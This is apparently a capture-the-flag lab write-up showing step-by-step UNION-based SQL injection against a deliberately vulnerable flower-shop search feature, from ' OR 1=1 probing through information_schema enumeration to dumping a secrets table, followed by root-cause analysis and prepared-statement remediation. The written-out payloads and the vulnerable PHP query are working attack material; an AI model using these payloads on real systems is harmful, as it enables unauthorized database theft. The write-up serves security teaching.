---
title: "SQL Injection – Full Database Extraction via Search Function | Flower Webverse Lab"
date: 2026-04-30 00:00:00 +0530
categories: [Web Security, SQL Injection]
tags: [sql-injection, union-based-sqli, information-disclosure, database-enumeration, webverse-lab]
platform: Webverse
author: Shivansh Sharma
image:
  path: /assets/images/posts/flower-webverse-sqli.webp
  alt: SQL Injection Database Extraction via Search Function
---
## Overview

This lab involves a vulnerable e-commerce application named **Flower**, where a SQL Injection flaw exists in the product search functionality. The vulnerability allows an attacker to manipulate backend SQL queries, leading to full database enumeration and extraction of sensitive information, including the final flag.

The issue stems from improper handling of user input, where search terms are directly embedded into SQL queries without sanitization or parameterization.

---

## Objective

- Identify SQL Injection in the search feature
- Understand backend query structure
- Determine column count and output mapping
- Enumerate database structure using `information_schema`
- Extract sensitive data from hidden tables
- Retrieve the final flag

---

## Vulnerability Context

Search bars are a common SQL Injection entry point because they are typically used in dynamic queries such as:

```sql
SELECT * FROM flowers WHERE name LIKE '%input%';
```

When user input is directly concatenated into SQL queries, it becomes part of the query logic instead of being treated as data. This allows attackers to manipulate query execution.

---

## Reconnaissance

The first test was a basic Boolean-based SQL Injection payload:

```
' OR 1=1-- -
```

### Result

The application returned all products instead of filtered results.

### Interpretation

This confirmed that:

- User input is directly injected into SQL queries
- The application does not sanitize input
- The query condition can be manipulated logically

This is a classic indicator of **Boolean-based SQL Injection**.

---

## Determining Column Count

Before performing UNION-based SQL Injection, the number of columns in the original query must be identified. This ensures the injected query matches the structure of the original response.

### Payloads Used

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
```

### Result

- Queries succeeded up to `ORDER BY 4`
- `ORDER BY 5` caused an error

### Conclusion

The backend query contains **4 columns**.

> This step is essential because UNION-based queries require column alignment between original and injected results.

---

## Identifying Visible Columns

Next, the goal was to determine which columns are reflected in the application output.

### Test Payload

```sql
' UNION SELECT 'a','b','c','d'-- -
```

### Observations

The application displayed values in specific positions:

| Position | Reflected As |
|----------|-------------|
| `b` | Product Name |
| `c` | Description |
| `d` | Price |

> **Key Insight:** Not all columns are rendered in the UI. Only reflected columns can be used for meaningful data extraction.

---

## Extracting Database Name

Once output mapping was understood, the database name was extracted:

```sql
' UNION SELECT 'a',database(),'c','4'-- -
```

### Result

**Active database:** `flowerhaven`

### Why This Matters

Knowing the database name allows targeted enumeration of tables and schema using `information_schema`.

---

## Enumerating Tables

The next step was to enumerate all tables within the current database.

```sql
' UNION SELECT 'a',table_name,'c','4'
FROM information_schema.tables
WHERE table_schema=database()-- -
```

### Discovered Tables

- `cart_items`
- `flowers`
- `messages`
- `secrets`
- `users`

### Analysis

Tables such as `users` and `secrets` are typically high-value targets because they often contain credentials, tokens, or sensitive application data.

---

## Enumerating Columns in Secrets Table

To understand the structure of the `secrets` table:

```sql
' UNION SELECT 1,column_name,3,4
FROM information_schema.columns
WHERE table_name='secrets'-- -
```

### Columns Found

- `id`
- `key`
- `value`

---

## Extracting Sensitive Data

With structure known, the final step was data extraction:

```sql
' UNION SELECT 1,id,`key`,`value` FROM secrets-- -
```

> **Why Backticks Were Used:** The column name `key` is a reserved SQL keyword. Backticks ensure it is interpreted as a column identifier rather than SQL syntax.

---

## Flag Retrieval

The query successfully returned stored secrets, including the final flag:

```
WEBVERSE{...}
```

---

## Exploitation Flow Summary

1. Search input identified as injection point
2. Boolean-based SQLi confirmed (`OR 1=1`)
3. Column count determined using `ORDER BY`
4. Output columns mapped using `UNION SELECT`
5. Database name extracted using `database()`
6. Tables enumerated via `information_schema.tables`
7. Columns extracted from `secrets` table
8. Sensitive data retrieved using UNION-based payload

---

## Vulnerability Analysis

The root cause is unsafe SQL query construction, likely similar to:

```php
$query = "SELECT * FROM flowers WHERE name LIKE '%$search%'";
```

Because user input is directly concatenated into SQL, attackers can break query structure and inject arbitrary SQL commands.

---

## Impact

If exploited in a real-world environment, this vulnerability could lead to:

- Full database extraction
- Access to user credentials or API keys
- Potential account takeover
- Exposure of internal application logic
- Further lateral movement depending on database privileges

---

## Remediation

### 1. Use Prepared Statements

```php
$stmt = $pdo->prepare("SELECT * FROM flowers WHERE name LIKE ?");
$stmt->execute(["%$search%"]);
```

### 2. Input Validation

Restrict or sanitize dangerous SQL meta-characters:

```
'
--
UNION
SELECT
```

### 3. Suppress Error Disclosure

Disable detailed errors in production:

```ini
display_errors = Off
```

---

## Key Takeaways

- Search inputs are high-risk SQL injection points
- UNION-based SQLi requires column alignment
- `information_schema` is essential for enumeration
- Output mapping determines exploitable columns
- Reserved SQL keywords require careful handling
- Small backend errors can reveal system structure

---

## Final Thoughts

This lab demonstrates how a single insecure search feature can lead to complete database compromise. Once SQL Injection is possible, attackers can systematically enumerate and extract nearly all backend data.

Secure coding practices such as prepared statements and strict input handling are critical to preventing this class of vulnerability.